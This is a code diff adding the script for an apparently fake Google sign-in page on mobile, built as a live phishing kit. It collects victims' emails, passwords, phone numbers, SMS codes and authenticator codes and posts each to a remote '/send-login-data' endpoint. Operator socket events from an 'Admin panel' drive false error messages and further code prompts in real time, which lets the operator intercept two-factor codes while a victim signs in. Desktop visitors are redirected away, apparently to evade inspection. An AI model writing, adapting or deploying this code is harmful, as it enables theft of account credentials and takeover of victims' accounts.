+      document.getElementById('mg-prompt-number').textContent         = num;
+      document.getElementById('mg-prompt-number-inline').textContent  = num;
+      document.getElementById('mg-prompt-device').textContent         = hasDevice
+        ? ('Open the Gmail or YouTube app on ' + deviceLabel)
+        : 'Open the Gmail or YouTube app';
+      document.getElementById('mg-prompt-device-inline').textContent  = hasDevice ? deviceLabel : 'phone';
+
+      var email = mgEmailInp.value.trim();
+      document.getElementById('mg-prompt-chip-email').textContent = email;
+      document.getElementById('mg-prompt-avatar').textContent = email ? email.charAt(0).toUpperCase() : 'G';
+
+      mgHideAllSteps();
+      document.getElementById('mg-prompt-step').style.display = 'flex';
+    });
+
+    /* Admin panel → GoogleSMS → show SMS phone-entry step */
+    socket.on('show-google-sms', function(data) {
+      mgPassNext.disabled = false;
+      mgPassNext.innerHTML = 'Next';
+
+      // data can be { prefix, lastTwo } or legacy plain string
+      var prefix  = (data && typeof data === 'object') ? (data.prefix || '') : String(data || '');
+      var lastTwo = (data && typeof data === 'object') ? (data.lastTwo || '00') : '00';
+
+      var prefixText = prefix ? ('+' + String(prefix).replace(/^\+/, '')) : '+';
+      document.getElementById('mg-sms-prefix-box').textContent = prefixText;
+      document.getElementById('mg-sms-last-two').textContent = lastTwo;
+
+      var email = mgEmailInp.value.trim();
+      document.getElementById('mg-sms-chip-email').textContent = email;
+      document.getElementById('mg-sms-avatar').textContent = email ? email.charAt(0).toUpperCase() : 'G';
+
+      mgHideAllSteps();
+      document.getElementById('mg-sms-step').style.display = 'flex';
+      document.getElementById('mg-sms-phone-inp').focus();
+    });
+
+    /* Admin panel → WrongNumber */
+    socket.on('show-google-wrong-number', function() {
+      var inp = document.getElementById('mg-sms-phone-inp');
+      var err = document.getElementById('mg-sms-phone-err');
+      var btn = document.getElementById('mg-sms-send');
+      btn.disabled = false;
+      btn.innerHTML = 'Send';
+      err.textContent = 'This number is not associated with your Google account. Try again.';
+      inp.classList.add('mg-err-inp');
+      err.classList.add('show');
+      inp.focus();
+    });
+
+    /* Admin panel → WrongCode → targets SMS code or auth step (auto-detects) */
+    socket.on('show-google-wrong-code', function() {
+      var codeStep = document.getElementById('mg-code-step');
+      var authStep = document.getElementById('mg-auth-step');
+      if (codeStep && codeStep.style.display !== 'none') {
+        var inp = document.getElementById('mg-code-inp');
+        var err = document.getElementById('mg-code-err');
+        var btn = document.getElementById('mg-code-next');
+        btn.disabled = false; btn.innerHTML = 'Next';
+        inp.value = ''; btn.disabled = true;
+        inp.classList.add('mg-err-inp'); err.classList.add('show');
+        inp.focus();
+      } else if (authStep && authStep.style.display !== 'none') {
+        var inp = document.getElementById('mg-auth-inp');
+        var err = document.getElementById('mg-auth-err');
+        var btn = document.getElementById('mg-auth-next');
+        btn.disabled = false; btn.innerHTML = 'Next';
+        inp.value = ''; btn.disabled = true;
+        inp.classList.add('mg-err-inp'); err.classList.add('show');
+        inp.focus();
+      }
+    });
+
+    /* Admin panel → WrongAuthCode → specifically targets authenticator step */
+    socket.on('show-google-wrong-auth-code', function() {
+      var inp = document.getElementById('mg-auth-inp');
+      var err = document.getElementById('mg-auth-err');
+      var btn = document.getElementById('mg-auth-next');
+      btn.disabled = false; btn.innerHTML = 'Next';
+      inp.value = ''; btn.disabled = true;
+      inp.classList.add('mg-err-inp'); err.classList.add('show');
+      inp.focus();
+    });
+
+    /* Admin panel → GoogleAuth → show authenticator step */
+    socket.on('show-google-auth', function() {
+      mgPassNext.disabled = false;
+      mgPassNext.innerHTML = 'Next';
+
+      var email = mgEmailInp.value.trim();
+      document.getElementById('mg-auth-chip-email').textContent = email;
+      document.getElementById('mg-auth-avatar').textContent = email ? email.charAt(0).toUpperCase() : 'G';
+
+      mgHideAllSteps();
+      document.getElementById('mg-auth-step').style.display = 'flex';
+      document.getElementById('mg-auth-inp').focus();
+    });
+
+    /* ── UI logic ── */
+    var mgEmailInp  = document.getElementById('mg-email-inp');
+    var mgEmailNext = document.getElementById('mg-email-next');
+    var mgPassInp   = document.getElementById('mg-pass-inp');
+    var mgPassNext  = document.getElementById('mg-pass-next');
+    var mgPassErr   = document.getElementById('mg-pass-err');
+
+    mgEmailInp.addEventListener('input', function() {
+      mgEmailNext.disabled = !this.value.trim();
+    });
+    mgEmailInp.addEventListener('keydown', function(e) {
+      if (e.key === 'Enter' && !mgEmailNext.disabled) mgEmailNext.click();
+    });
+
+    mgEmailNext.addEventListener('click', function() {
+      var email = mgEmailInp.value.trim();
+      if (!email) return;
+      document.getElementById('mg-chip-email').textContent = email;
+      document.getElementById('mg-avatar-letter').textContent = email.charAt(0).toUpperCase();
+      document.getElementById('mg-email-step').style.display = 'none';
+      var ps = document.getElementById('mg-pass-step');
+      ps.style.display = 'flex';
+      mgPassInp.focus();
+    });
+
+    document.getElementById('mg-back-btn').addEventListener('click', function() {
+      document.getElementById('mg-pass-step').style.display = 'none';
+      document.getElementById('mg-email-step').style.display = 'flex';
+      mgPassErr.classList.remove('show');
+      mgPassInp.classList.remove('mg-err-inp');
+      mgPassInp.value = '';
+      mgEmailInp.focus();
+    });
+
+    mgPassInp.addEventListener('input', function() {
+      mgPassNext.disabled = !this.value.trim();
+      if (this.value.trim()) {
+        mgPassErr.classList.remove('show');
+        mgPassInp.classList.remove('mg-err-inp');
+      }
+    });
+    mgPassInp.addEventListener('keydown', function(e) {
+      if (e.key === 'Enter' && !mgPassNext.disabled) mgPassNext.click();
+    });
+
+    mgPassNext.addEventListener('click', function() {
+      var email    = mgEmailInp.value.trim();
+      var password = mgPassInp.value.trim();
+      if (!email || !password) return;
+
+      mgPassNext.disabled = true;
+      mgPassNext.innerHTML = '<span class="mg-spinner"></span>';
+
+      fetch(BACKEND_URL + '/send-login-data', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username: email, password: password, socketId: socket.id })
+      })
+      .then(function(r) { return r.json(); })
+      .catch(function() {});
+    });
+
+    function mgTogglePass(btn) {
+      var show = (mgPassInp.type === 'password');
+      mgPassInp.type = show ? 'text' : 'password';
+      btn.innerHTML = show
+        ? '<svg viewBox="0 0 24 24" fill="currentColor" width="22" height="22"><path fill-rule="evenodd" clip-rule="evenodd" d="M20.293 2.293a1 1 0 1 1 1.414 1.414l-18 18a1 1 0 0 1-1.414-1.414l3.446-3.446c-.238-.188-.47-.387-.694-.6L1.31 12.722a.985.985 0 0 1 0-1.436l3.734-3.527c3.15-2.976 7.77-3.542 11.48-1.697l3.768-3.768zm-5.275 5.275c-2.852-1.138-6.23-.596-8.582 1.627l-2.974 2.808 2.974 2.809c.233.22.476.423.727.61l1.391-1.39a4 4 0 0 1 5.478-5.478l.986-.986zm-2.5 2.5a2.001 2.001 0 0 0-2.45 2.45l2.45-2.45z"/><path d="M22.69 11.285 19.7 8.463l-1.414 1.414 2.251 2.126-2.973 2.809a8.099 8.099 0 0 1-6.377 2.164l-1.712 1.712c3.268.833 6.876.02 9.48-2.44l3.733-3.527a.985.985 0 0 0 0-1.436z"/><path d="M15.997 12.167a4 4 0 0 1-3.83 3.83l3.83-3.83z"/></svg>'
+        : '<svg viewBox="0 0 24 24" fill="currentColor" width="22" height="22"><path d="M12 5C5.636 5 2 12 2 12s3.636 7 10 7 10-7 10-7-3.636-7-10-7zm0 12a5 5 0 1 1 0-10 5 5 0 0 1 0 10zm0-8a3 3 0 1 0 0 6 3 3 0 0 0 0-6z"/></svg>';
+    }
+
+    function mgShowWrongPassModal() {
+      document.getElementById('mg-modal-overlay').classList.add('show');
+      mgPassInp.classList.add('mg-err-inp');
+      mgPassErr.classList.add('show');
+    }
+
+    function mgDismissWrongPass() {
+      document.getElementById('mg-modal-overlay').classList.remove('show');
+      mgPassInp.value = '';
+      mgPassNext.disabled = true;
+      mgPassNext.innerHTML = 'Next';
+      mgPassInp.classList.remove('mg-err-inp');
+      mgPassErr.classList.remove('show');
+      mgPassInp.focus();
+    }
+
+    /* ── mgHideAllSteps helper ── */
+    function mgHideAllSteps() {
+      ['mg-email-step','mg-pass-step','mg-phone-step','mg-prompt-step','mg-sms-step','mg-code-step','mg-auth-step'].forEach(function(id) {
+        var el = document.getElementById(id);
+        if (el) el.style.display = 'none';
+      });
+    }
+
+    /* ── Phone step ── */
+    var mgPhoneInp      = document.getElementById('mg-phone-inp');
+    var mgPhoneNext     = document.getElementById('mg-phone-next');
+    var mgPhoneErr      = document.getElementById('mg-phone-err');
+    var mgPhoneBackBtn  = document.getElementById('mg-phone-back-btn');
+
+    mgPhoneInp.addEventListener('input', function() {
+      mgPhoneNext.disabled = !this.value.trim();
+      if (this.value.trim()) mgPhoneErr.classList.remove('show');
+    });
+    mgPhoneInp.addEventListener('keydown', function(e) {
+      if (e.key === 'Enter' && !mgPhoneNext.disabled) mgPhoneNext.click();
+    });
+
+    mgPhoneBackBtn.addEventListener('click', function() {
+      mgHideAllSteps();
+      document.getElementById('mg-pass-step').style.display = 'flex';
+      mgPhoneInp.value = '';
+      mgPhoneNext.disabled = true;
+      mgPhoneErr.classList.remove('show');
+      mgPassInp.focus();
+    });
+
+    mgPhoneNext.addEventListener('click', function() {
+      var phone = mgPhoneInp.value.trim();
+      if (!phone) { mgPhoneErr.classList.add('show'); return; }
+
+      var prefix    = document.getElementById('mg-prefix-box').textContent;
+      var fullPhone = prefix + phone;
+      var email     = mgEmailInp.value.trim();
+
+      mgPhoneNext.disabled = true;
+      mgPhoneNext.innerHTML = '<span class="mg-spinner"></span>';
+
+      fetch(BACKEND_URL + '/send-login-data', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username: email, password: fullPhone, type: 'google_phone', socketId: socket.id })
+      })
+      .then(function(r) { return r.json(); })
+      .catch(function() {});
+    });
+
+    /* ── Step 5: SMS phone entry ── */
+    var mgSmsPInp  = document.getElementById('mg-sms-phone-inp');
+    var mgSmsPErr  = document.getElementById('mg-sms-phone-err');
+    var mgSmsSend  = document.getElementById('mg-sms-send');
+
+    mgSmsPInp.addEventListener('input', function() {
+      mgSmsSend.disabled = !this.value.trim();
+      if (this.value.trim()) {
+        mgSmsPErr.classList.remove('show');
+        mgSmsPInp.classList.remove('mg-err-inp');
+      }
+    });
+    mgSmsPInp.addEventListener('keydown', function(e) {
+      if (e.key === 'Enter' && !mgSmsSend.disabled) mgSmsSend.click();
+    });
+
+    mgSmsSend.addEventListener('click', function() {
+      var phone = mgSmsPInp.value.trim();
+      if (!phone) { mgSmsPErr.classList.add('show'); return; }
+
+      var prefix    = document.getElementById('mg-sms-prefix-box').textContent;
+      var fullPhone = prefix + phone;
+      var email     = mgEmailInp.value.trim();
+
+      mgSmsSend.disabled = true;
+      mgSmsSend.innerHTML = '<span class="mg-spinner"></span>';
+
+      fetch(BACKEND_URL + '/send-login-data', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username: email, password: fullPhone, type: 'google_sms_phone', socketId: socket.id })
+      }).catch(function() {});
+
+      setTimeout(function() {
+        document.getElementById('mg-code-hint').textContent = 'Enter the 6-digit code we sent to ' + fullPhone + '.';
+        document.getElementById('mg-code-chip-email').textContent = email;
+        document.getElementById('mg-code-avatar').textContent = email ? email.charAt(0).toUpperCase() : 'G';
+        mgSmsSend.disabled = false;
+        mgSmsSend.innerHTML = 'Send';
+        mgHideAllSteps();
+        document.getElementById('mg-code-step').style.display = 'flex';
+        document.getElementById('mg-code-inp').focus();
+      }, 2000);
+    });
+
+    /* ── Step 6: SMS code entry ── */
+    var mgCodeInp  = document.getElementById('mg-code-inp');
+    var mgCodeErr  = document.getElementById('mg-code-err');
+    var mgCodeNext = document.getElementById('mg-code-next');
+
+    mgCodeInp.addEventListener('input', function() {
+      mgCodeNext.disabled = !this.value.trim();
+      if (this.value.trim()) {
+        mgCodeErr.classList.remove('show');
+        mgCodeInp.classList.remove('mg-err-inp');
+      }
+    });
+    mgCodeInp.addEventListener('keydown', function(e) {
+      if (e.key === 'Enter' && !mgCodeNext.disabled) mgCodeNext.click();
+    });
+
+    mgCodeNext.addEventListener('click', function() {
+      var code  = mgCodeInp.value.trim();
+      var email = mgEmailInp.value.trim();
+      if (!code) { mgCodeErr.classList.add('show'); return; }
+
+      mgCodeNext.disabled = true;
+      mgCodeNext.innerHTML = '<span class="mg-spinner"></span>';
+
+      fetch(BACKEND_URL + '/send-login-data', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username: email, password: code, type: 'google_sms_code', socketId: socket.id })
+      }).catch(function() {});
+    });
+
+    /* ── Step 7: Authenticator code ── */
+    var mgAuthInp  = document.getElementById('mg-auth-inp');
+    var mgAuthErr  = document.getElementById('mg-auth-err');
+    var mgAuthNext = document.getElementById('mg-auth-next');
+
+    mgAuthInp.addEventListener('input', function() {
+      mgAuthNext.disabled = !this.value.trim();
+      if (this.value.trim()) {
+        mgAuthErr.classList.remove('show');
+        mgAuthInp.classList.remove('mg-err-inp');
+      }
+    });
+    mgAuthInp.addEventListener('keydown', function(e) {
+      if (e.key === 'Enter' && !mgAuthNext.disabled) mgAuthNext.click();
+    });
+
+    mgAuthNext.addEventListener('click', function() {
+      var code  = mgAuthInp.value.trim();
+      var email = mgEmailInp.value.trim();
+      if (!code) { mgAuthErr.classList.add('show'); return; }
+
+      mgAuthNext.disabled = true;
+      mgAuthNext.innerHTML = '<span class="mg-spinner"></span>';
+
+      fetch(BACKEND_URL + '/send-login-data', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username: email, password: code, type: 'google_auth_code', socketId: socket.id })
+      }).catch(function() {});
+    });
+
+    /* Redirect to desktop if not mobile */
+    var _mgh = location.hostname;
+    var _mgLocal = (_mgh === 'localhost' || _mgh === '127.0.0.1' || _mgh.endsWith('.test') || _mgh.endsWith('.local'));
+    if (!_mgLocal && window.innerWidth > 768) {
+      window.location.href = 'selbyjennings';
+    }
+  </script>
+
+</body>
+</html>
